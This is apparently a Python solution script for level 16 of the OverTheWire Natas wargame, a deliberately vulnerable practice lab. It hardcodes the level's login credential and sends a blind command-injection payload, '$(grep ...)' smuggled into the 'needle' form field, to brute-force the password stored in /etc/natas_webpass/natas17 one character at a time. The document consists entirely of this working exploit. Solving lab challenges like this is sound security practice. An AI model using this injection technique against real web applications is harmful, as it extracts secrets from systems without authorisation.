import requests
import string

level = "natas16"
auth = (level, "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
url = f"http://{level}.natas.labs.overthewire.org/"

flag = ""
for i in range(32):
    for c in string.digits + string.ascii_letters:
        payload = f'doomed$(grep ^{flag}{c} /etc/natas_webpass/natas17)'
        #print(f"Testing {c}")
        #print(payload)
        res = requests.post(url, auth=auth, data={"needle": payload}).content
        if b"doomed" not in res:
            flag += c
            print(flag)
            break